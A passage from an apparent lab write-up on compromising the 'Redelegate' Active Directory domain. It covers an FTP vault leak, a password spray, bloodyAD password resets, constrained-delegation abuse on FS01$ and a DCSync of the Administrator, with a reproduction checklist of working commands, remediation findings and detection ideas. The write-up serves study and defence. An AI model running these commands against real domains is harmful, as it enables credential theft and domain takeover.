bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' get membership 'Administrator'
```

Observed:

```text
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
memberOf: Domain Admins; Enterprise Admins; Schema Admins; Administrators; ...
```

**Root cause of the failed Administrator attempt:** `NOT_DELEGATED` is configured on Administrator. The successful ticket for the DC identity showed the delegation path was not globally broken. The failure was **principal-specific**. The transcript did not show Administrator in `Protected Users`; don't conflate that mechanism with the explicitly observed `NOT_DELEGATED` flag.

#### Domain-controller identity and replication

The domain SID enumeration had resolved `REDELEGATE\DC$` (RID 1002). A domain controller machine account normally has directory replication capabilities; this offered a way around Administrator's delegation restriction.

A service-ticket cache named for `DC` was directly shown as created. Later guidance also used the explicit `DC$` principal and a cache path such as `DC$@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache`. **The exact cache-selection/export commands used before the successful DCSync were not pasted**, so this report does not assert which cache filename was active when replication worked.

The resulting successful RPC replication operation is independently shown in the next section. The takeaway is precise: **a usable delegated DC machine identity was obtained; directly delegated Administrator impersonation was not**.

---

### Final escalation: confirmed DCSync

The operator executed:

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.50 -target-ip 10.129.234.50 -just-dc-user Administrator 'redelegate.vl/DC$@dc.redelegate.vl'
```

This specifically requested the Administrator account through the DRSUAPI method rather than dumping the entire directory.

Recorded output:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:[REDACTED_HEX]:<REDACTED_ADMIN_NT_HASH>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:<REDACTED_AES256_KEY>
Administrator:aes128-cts-hmac-sha1-96:<REDACTED_AES128_KEY>
Administrator:des-cbc-md5:<REDACTED_DES_KEY>
[*] Cleaning up...
```

**Result:** The domain's Administrator NTLM hash and three Kerberos key types were recovered. This demonstrates **domain compromise** through directory replication rights, independent of whether a subsequent interactive Administrator session was established.

Follow-up commands were suggested to validate pass-the-hash access with `nxc smb`, `evil-winrm`, or `impacket-psexec`, and to retrieve `root.txt` / `user.txt`. **No resulting output appears in this record**; do not include a claimed root flag, SYSTEM shell, or complete host-level validation without further evidence.

---

### Failure log, rabbit holes, and operator mistakes

This box was successful partly because the route was corrected after multiple wrong turns. Record these mistakes as part of the methodology rather than hiding them.

| # | What happened | Why it failed / risk | Durable fix |
|---|---|---|---|
| 1 | FTP initially transferred the binary `.kdbx` in ASCII mode. | Bare-linefeed warning; potential binary corruption. | Switch to `binary` before transferring vaults, archives, executables, databases. Verify file signatures and checksums. |
| 2 | John failed on the targeted 2000–2026 seasonal list even though it included `<KEEPass_MASTER_AND_MARIE_PASSWORD>`. | Contradiction not conclusively explained by available evidence; file/hash integrity needed checking. | Re-extract from verified binary download; keep the failed result in notes rather than hand-waving. |
| 3 | Tried to install `keepassxc-cli` as an APT package. | Package doesn't exist separately here. | Install `keepassxc`; CLI comes with it. |
| 4 | APT was blocked by mirror routing/DNS failures. | Infrastructure problem, not a target finding. | Diagnose `ip route`, resolver, and gateway separately; don't misclassify it as HTB behavior. |
| 5 | Spent time on anonymous SMB, RPC, LDAP, RID brute force. | DC allowed some null authentication but denied useful anonymous enumeration. | Record one definitive test per protocol; pivot to alternate authenticated enumeration surfaces. |
| 6 | Treated `impacket-lookupsid` timeout like an access restriction in discussion. | Timeout is connectivity, not authorization evidence. | Preserve exact error classes: refused vs timed out vs access denied. |
| 7 | Feroxbuster failed to connect; default IIS page produced no finds. | Connection failure isn't a negative content-enumeration result. | Reconfirm network connectivity and rerun only if still relevant. |
| 8 | Pursued SQL tables, Agent jobs, linked servers, and sysadmin features but nearly discarded low-privilege MSSQL. | **Largest strategic mistake:** identity-resolution APIs remained accessible and disclosed the entire domain username set. | **Always enumerate DB engine identity, Windows/domain integration, exposed metadata, and identity-resolution functions before deprioritizing it.** |
| 9 | Pasted multi-line SQL into `impacket-mssqlclient`. | Each line was interpreted as a separate statement. | Use a complete query per line or a client mode explicitly supporting batching. |
| 10 | Queried non-existent `state_desc` from `sys.fn_my_permissions`. | Confused function return schema with `sys.server_permissions`. | `SELECT *` initially; inspect column schema, then refine. |
| 11 | First SQL RID sweep concatenated incompatible `varbinary` and `varchar`. | `REVERSE(CONVERT(binary(4),...))` introduced a type mismatch. | Append four explicitly typed `binary(1)` RID bytes in little-endian order. |
| 12 | Considered `FS01` direct SMB routing and future pivoting. | FS01 IP was in an unreachable subnet via local gateway. | Distinguish host reachability from AD object control; modify the directory object through the reachable DC when scope permits. |
| 13 | S4U2Proxy as Administrator failed. | Administrator had `NOT_DELEGATED`; not evidence FS01 KCD was broken. | Inspect target principal UAC / delegation protections; validate with an eligible identity. |
| 14 | Initially described `SQLGuest` as a dead end because it was `guest` in `master`. | Conflated inability to run privileged SQL with inability to enumerate Windows identities. | Treat low-privilege access as a discovery channel until relevant features are evaluated. |
| 15 | Some critical command success messages weren't preserved in chat. | Reduces reproducibility/reporting precision despite clear downstream proof. | Capture commands, standard output, and before/after object values immediately after each change. |

#### Misleading signals worth remembering

- **`Null Auth:True` ≠ anonymous shares / directory access.** Authentication transport and access authorization are distinct.
- **`VIEW ANY DATABASE` ≠ data access to all databases.** `HAS_DBACCESS('model')` returned `0`.
- **No SQL Agent or sysadmin ≠ no useful MSSQL capability.** `SUSER_SNAME()` still worked.
- **A machine-account DNS record ≠ a reachable machine.** FS01's directory object was the relevant asset.
- **`STATUS_ACCOUNT_RESTRICTION` ≠ a proven password match.** Keep the distinction in the spray log.
- **S4U2Proxy success for one principal ≠ success for all principals.** `NOT_DELEGATED` still protected Administrator against direct delegation.
- **DCSync success ≠ evidence that flags were collected.** Report the outcome precisely.

---

### Compact reproduction checklist

This is a condensed operator reference; detailed evidence, caveats, and exact outputs are above. Replace any expired lab IPs and avoid reusing the embedded lab passwords elsewhere.

```bash
# Recon
sudo nmap -Pn -n -sC -sV -p 21,53,80,88,135,139,389,445,1433,3389,5985 10.129.234.50

# FTP: anonymous; use binary before downloading Shared.kdbx
ftp 10.129.234.50

# Vault
keepassxc-cli ls -R Shared.kdbx     # master password: <KEEPass_MASTER_AND_MARIE_PASSWORD>
keepassxc-cli show -s Shared.kdbx 'IT/SQL Guest Access'

# SQL access
impacket-mssqlclient 'SQLGuest:<SQLGUEST_PASSWORD>'@10.129.234.50
```

In the SQL shell:

```sql
SELECT DEFAULT_DOMAIN() AS mydomain;
SELECT SUSER_SID('REDELEGATE\Domain Admins');
;WITH R AS (SELECT 500 AS rid UNION ALL SELECT rid+1 FROM R WHERE rid<2500) SELECT R.rid, A.account_name FROM R CROSS APPLY (SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847a + CONVERT(binary(1),R.rid%256) + CONVERT(binary(1),(R.rid/256)%256) + CONVERT(binary(1),(R.rid/65536)%256) + CONVERT(binary(1),(R.rid/16777216)%256)) AS account_name) A WHERE A.account_name IS NOT NULL ORDER BY R.rid OPTION (MAXRECURSION 0);
```

Back in Parrot:

```bash
nxc smb 10.129.234.50 -d redelegate.vl -u loot/users.txt -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' --continue-on-success
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' get membership 'Marie.Curie'
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' get object 'Helen.Frost' --attr nTSecurityDescriptor --resolve-sd
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' set password 'Helen.Frost' '<HELEN_TEST_PASSWORD>'
evil-winrm -i 10.129.234.50 -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>'
```

After verifying Helen's rights and `FS01$` ACL:

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' set password 'FS01$' '<FS01_TEST_PASSWORD>'
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
impacket-getST -dc-ip 10.129.234.50 -spn 'cifs/dc.redelegate.vl' -impersonate 'DC' 'redelegate.vl/FS01$:<FS01_TEST_PASSWORD>'

# With the appropriate DC-machine-identity delegated ticket cache selected:
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.50 -target-ip 10.129.234.50 -just-dc-user Administrator 'redelegate.vl/DC$@dc.redelegate.vl'
```

**Note on the reproduction block:** The last command requires a usable Kerberos cache for the intended service/principal. The transcript proves that a successful cache-assisted DCSync occurred, but does not show every cache command. A separate Administrator S4U attempt failed due to `NOT_DELEGATED`; it was not part of the successful DCSync path.

---

## Impact

DRSUAPI retrieval of the domain Administrator's credential material was demonstrated. A subsequent Administrator shell and flag retrieval are not shown.

### Reporting-ready evidence index

| Evidence ID | Discovery / proof | Source in supplied record |
|---|---|---|
| E01 | Anonymous FTP file list | Nmap `ftp-anon` output |
| E02 | Audit memo and `SeasonYear!` clue | `CyberAudit.txt`, `TrainingAgenda.txt` contents |
| E03 | KeePass opened; list and individual entries | `keepassxc-cli ls -R`, `show -s` |
| E04 | Low-privilege `SQLGuest` session | `impacket-mssqlclient` initial login and queries |
| E05 | MSSQL RID enumeration | Full `SUSER_SNAME()` RID output |
| E06 | Marie.Curie credential reuse | `nxc smb` eight-user spray output |
| E07 | Marie Helpdesk membership | `bloodyAD get membership` |
| E08 | Helpdesk ForceChangePassword over Helen | Helen `nTSecurityDescriptor` ACL.11 |
| E09 | Helen WinRM/IT/delegation privilege | `whoami /all`, `whoami /priv`, `hostname` |
| E10 | FS01$ writable attributes | `bloodyAD get writable --otype COMPUTER --detail` |
| E11 | FS01$ GenericAll for IT | FS01 DACL ACL.6 |
| E12 | Successful DC S4U2Proxy ticket | `impacket-getST` S4U2Self/S4U2Proxy output |
| E13 | Administrator NOT_DELEGATED | `bloodyAD get object Administrator` |
| E14 | Administrator DCSync material | `impacket-secretsdump -just-dc-user Administrator` output |

**Evidence completeness notes:** Preserve screenshots/output for post-change `FS01$` attributes, an explicit computer-account password-reset confirmation, and ticket-cache contents in future engagements. The available record does not contain those specific artifacts. It **does** contain direct evidence of final DCSync success.

---

### Closeout and next evidence

**Confirmed final outcome:** targeted DCSync of domain Administrator using a delegated DC machine identity, with recovered NTLM and Kerberos keys. This is sufficient evidence of compromise of the Active Directory domain's credential security boundary.

**Not confirmed in this record:** subsequent Administrator SMB/WinRM authentication, SYSTEM session, `user.txt` retrieval, `root.txt` retrieval, or restoration of the modified `FS01$` settings. If these were performed, append the command output and proof before upgrading the report's host-level outcome.

**Cleanup reminder for any non-disposable authorized environment:** Restore the original delegation settings and machine account state through a coordinated procedure; reset compromised credentials and rotate exposed material. Simply deleting `msDS-AllowedToDelegateTo` does not necessarily reverse all modifications, and restoring a machine's prior password is not always possible from a tester's notes.

**Core lesson:** The strongest exploit was not an exotic SQL Server misconfiguration. It was the combined effect of a leaked vault, credential reuse, an ACL granting password reset, excessive computer-object control, and an available SQL **identity-enumeration primitive** that made the chain discoverable. This is why enumeration must be broader than standard service-exploitation checklists.

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Root causes, impact, and remediation

These are distinct control failures that compounded into a domain compromise. Severity reflects the **observed attack chain**, not a general claim that any one feature is inherently insecure.

#### F-01 - Sensitive files exposed through anonymous FTP

**Severity:** High (chain-enabling) · **Indicative CWE:** CWE-552 (Files or Directories Accessible to External Parties)  
**Evidence:** `ftp-anon` exposed `Shared.kdbx`, `CyberAudit.txt`, `TrainingAgenda.txt`.  
**Impact:** Unauthenticated discovery of credential material and internal security context.  
**Remediation:** Disable anonymous FTP or sharply restrict its root; remove password vaults and internal audits from publicly readable locations; use authenticated file transfer; monitor access and rotate exposed secrets.

#### F-02 - Password reuse between KeePass and an AD user

**Severity:** High · **Indicative CWE:** CWE-521 (Weak Password Requirements), paired with credential-reuse policy failure  
**Evidence:** KeePass opened with `<KEEPass_MASTER_AND_MARIE_PASSWORD>`; SMB accepted `REDELEGATE\Marie.Curie` with that same password.  
**Impact:** Credential compromise translated directly into a domain foothold.  
**Remediation:** Unique vault master passwords and unique AD credentials; enforced strong password policies, screening for predictable `SeasonYear!` patterns, MFA where applicable, and rotation after exposure.

#### F-03 - Excessive Helpdesk password-reset delegation

**Severity:** High · **Indicative CWE:** CWE-269 / CWE-732  
**Evidence:** Inherited ACE on Helen: `Helpdesk` + `CONTROL_ACCESS` + `User-Force-Change-Password`; Marie confirmed member of Helpdesk.  
**Impact:** A Helpdesk compromise enabled takeover of Helen's account and an interactive WinRM session on the DC.  
**Remediation:** Narrow password-reset delegation to designated OUs and nonprivileged users; separate privileged identities from routine helpdesk administration; regularly audit inheritance and extended rights; alert on privileged password resets.

#### F-04 - Excessive IT control of a computer account

**Severity:** Critical in this chain · **Indicative CWE:** CWE-269 / CWE-732  
**Evidence:** `IT` granted `GENERIC_ALL` on `FS01$`; Helen belonged to IT; writable attributes included `unicodePwd`, `userAccountControl`, `msDS-AllowedToDelegateTo`.  
**Impact:** Account takeover and creation/modification of constrained-delegation trust enabling impersonation of a DC identity.  
**Remediation:** Remove unnecessary GenericAll from computer objects; restrict delegation administration; investigate and decommission stale computer accounts; monitor `FS01$` password/UAC/delegation changes; require separate privileged roles for domain delegation work.

#### F-05 - Delegation configuration enabled directory replication impersonation

**Severity:** Critical (observed outcome) · **Indicative CWE:** CWE-269 / CWE-863  
**Evidence:** `SeEnableDelegationPrivilege`, editable `FS01$`, successful S4U2Proxy for DC identity, successful targeted DRSUAPI DCSync.  
**Impact:** Recovery of the domain Administrator credential material; practical domain compromise.  
**Remediation:** Restrict `SeEnableDelegationPrivilege`, audit classic KCD targets, avoid delegable high-impact service identities where feasible, enforce least privilege over machine objects, and monitor Kerberos S4U and directory replication anomalies. Administrator's `NOT_DELEGATED` setting worked against **direct** impersonation of that account, but was not a complete defense against the compromised DC identity.

#### Detection and audit ideas

- Look for unexpected anonymous FTP retrieval of `.kdbx` and internal audit files.
- Correlate bursts of SMB authentication attempts across multiple user accounts using one candidate password.
- Alert on password-reset operations against sensitive accounts and changes to AD object ACLs.
- Monitor modifications to `userAccountControl`, `msDS-AllowedToDelegateTo`, `servicePrincipalName`, and computer-account passwords.
- Alert on anomalous S4U service-ticket requests and directory replication activity by unexpected security principals or from unexpected machines.
- Treat SQL-integrated Windows identity enumeration as potential reconnaissance, even from a low-privilege SQL login.

---

### Improved CPTS operator checklist - databases are mandatory

Whenever database access is obtained, even under a `guest` account or with only `master`/`msdb` visible:

- [ ] Identify engine, instance, host, patch level, Windows/domain binding, authentication type, and execution context.
- [ ] Enumerate all visible databases and **test effective access** to each; distinguish visible from readable.
- [ ] Enumerate schemas, tables, views, stored procedures, and accessible records; look for application secrets and configuration data.
- [ ] Enumerate server and database roles, explicit and effective privileges, linked servers, jobs, credentials, configuration, and backup metadata.
- [ ] Probe database-specific **identity enumeration** and integration primitives (for MSSQL: `DEFAULT_DOMAIN()`, `SUSER_SID()`, `SUSER_SNAME()`, appropriate server metadata).
- [ ] Check impersonation and delegation-related SQL capabilities where legitimately available; don't require `sysadmin` before discovering identities.
- [ ] Extract and label identities/credentials with **provenance**; test reuse across relevant in-scope services with lockout awareness.
- [ ] Save the exact successful query, output, errors, and constraints; do not silently convert a timeout into an access-denied conclusion.
- [ ] Only deprioritize the database after the applicable capabilities are actually tested or their inaccessible state is documented.

**Permanent lesson from Redelegate:** An apparently underprivileged MSSQL login disclosed the identity graph needed to compromise the domain. We almost lost the correct path by evaluating SQL only as a command-execution surface rather than also as a directory-enumeration surface.

---
